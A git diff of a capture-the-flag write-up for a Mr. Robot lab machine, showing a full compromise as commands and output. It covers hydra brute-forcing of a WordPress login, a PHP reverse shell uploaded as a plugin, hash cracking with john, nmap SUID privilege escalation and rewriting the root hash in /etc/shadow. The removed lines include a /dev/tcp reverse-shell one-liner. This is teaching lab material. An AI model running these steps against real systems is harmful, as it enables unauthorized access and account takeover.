@@ -8,90 +8,76 @@ _The first thing I checked was:_
 https://10.0.4.5/robots.txt
 
 _This is what I've got:_<br>
-User-agent: *<br>
-fsocity.dic<br>
-key-1-of-3.txt
+> User-agent: *<br>
+> fsocity.dic<br>
+> key-1-of-3.txt
 
 > [!NOTE]
 > _key-1-of-3.txt is a flag for ctf doers._
 
-Let's try to hack the hash:
-john --wordlist=fsocity.dic --format=raw-md4 hash.txt
-There is no answer for this hash in fsocity.dic.
+**After some research I figured out that that was a wordpress site.**<br>
+Then, I found the login page and started preparing for bruteforce.
+Probably there was an easier way, but I ran BurpSuite intercepted traffic while trying to login, and got this line:<br>
+> log=user&pwd=pwd&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.0.4.5%2Fwp-admin%2F&testcookie=1
 
-log=user&pwd=pwd&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.0.4.5%2Fwp-admin%2F&testcookie=1
+This is how looked a command for bruteforcing a username:<br>
+`hydra -L fsocity.dic -p test 10.0.4.5 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp submit=Log+In&redirect_to=http%3A%2F%2F10.0.4.5%2Fwp-admin%2F&testcookie=1:Invalid username" -V`
+> [80][http-post-form] host: 10.0.4.5   login: Elliot   password: test
 
-curl -v --data 'log=user&pwd=pwd&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.0.4.5%2Fwp-admin%2F&testcookie=1' --cookie 'wordpress_test_cookie=WP+Cookie+check' http://10.0.4.5/wp-login.php
+Now I need to bruteforce the password. But first we need to remove dublications from the file since there is a lot of them.
+`sort fsocity.dic | uniq > new_fsocity.dic`
 
-hydra -L fsocity.dic -p admin 10.0.4.5 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.0.4.5%2Fwp-admin%2F&testcookie=1:Invalid username" -V
+You can check the lenght of the file before and after using this command:
+`wc -l`
 
-[80][http-post-form] host: 10.0.4.5   login: Elliot   password: admin
-found the right username. Now I am gonna look for a password
+Then run password bruteforcing.
+`hydra -l Elliot -P n_fsocity.dic 10.0.4.5 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.0.4.5%2Fwp-admin%2F&testcookie=1:The password you entered" -V`
 
-hydra -l Elliot -P fsocity.dic 10.0.4.5 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.0.4.5%2Fwp-admin%2F&testcookie=1:The password you entered" -V
+Username: _Elliot_
+Password: _ER28-0652_
 
-Looks like it does not work.
+Looks like I can upload my own plugins, so I found a simple php reverse-shell, and zipped it, so wordpress thinks it is a plugin.
+`zip rev-plug.zip ./shell.php`
 
-But we know that there is a user named elliot.
-
-WordPress version 4.3.32
-
-hydra -t64 -L fsocity.dic -p test 10.0.4.5 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.0.4.5%2Fwp-admin%2F&testcookie=1:Invalid" -V
-
-wpscan --url 10.0.4.5 --usernames Elliot --passwords fsocity.dic --password-attack wp-login
-
-Do not forget to remove repeats
-sort fsocity.dic | uniq > fsocity.dic 
-
-To find how many lines left:
-wc -l
-
-Now we can do brute force again and hopefully we will find a password for the wordpress admin page
-Username: Elliot
-Password: ER28-0652
-
-zip rev-plug.zip ./shell.php
-
-upload the plugin, set up a nc listener, and activate the plugin. Now we have a reverse-shell.
+Upload the plugin, set up a nc listener, and activate the plugin. Now we have a reverse-shell.
+Use this command to upgrade the shell:
+`python -c 'import pty; pty.spawn("/bin/bash")'`
 
 We can see that there is a user named robot. Go to his folder and we will find:
-key-2-of-3.txt
-password.raw-md5
+> key-2-of-3.txt - Second key for ctfers
+> password.raw-md5
 
-We do not have permission to read key-2-of-3.txt, but reading password.raw-md5 we will see:
+This is what I have found in password.raw-md5
 robot:c3fcd3d76192e4007dfb496cca67e13b
+
 Let's crack the hash.
-john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt robot_hash.txt
+`john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt robot_hash.txt`
 username: robot
 password: abcdefghijklmnopqrstuvwxyz
 
-use this command to upgrade the shell:
-python -c 'import pty; pty.spawn("/bin/bash")'
+Change current user to robot.
 
-Log in as robot.
+## Almost there
+**Now we need to find a way to escalate our privileges.**
 
-And now we've got the second key.
+We cannot run sudo. Let's look what we can do.
+I used the next command to find files that I can run with their owner privileges.
+`find / -perm -u=s -type f 2>/dev/null`
+One of these files was nmap.
 
-we cannot run sudo. Let's look what we can do.
+It is useful to have a simple hash if we need in any case.
+> WVLY0mgH0RtUI = mrcake
 
-nmap -iL /etc/shadow
+> [!NOTE]
+> https://gtfobins.github.io/
+> Useful site to find ways for privilege escalation.
 
-root:$6$9xQC1KOf$5cmONytt0VF/wi3Np3jZGRSVzpGj6sXxVHkyJLjV4edlBxTVmW91pcGwAViViSWcAS/.OF0iuvylU5IznY2Re.:16753:0:99999:7:::
+To escalate our privileges with nmap I do:
+`nmap --interactive`
+`!sh`
 
-WVLY0mgH0RtUI = mrcake
+Then modify the password of root in /etc/shadow to our known hash, so that you can easily access it again.
+`nano /etc/shadow`
+`root:WVLY0mgH0RtUI:16753:0:99999:7:::`
 
-nmap --interactive
-!sh
-
-Then modify the password of root in /etc/shadow so that you can easily access it again.
-
-root:WVLY0mgH0RtUI:16753:0:99999:7:::
-
-LFILE=/etc/shadow
-nmap -oG=$LFILE "root:WVLY0mgH0RtUI:16753:0:99999:7:::"
-
-TF=$(sh)
-echo 'os.execute("/bin/sh")' > $TF
-./nmap --script=$TF
-
-bash -i >& /dev/tcp/10.0.4.4/4444 0>&1
+**Thank you for attention.**
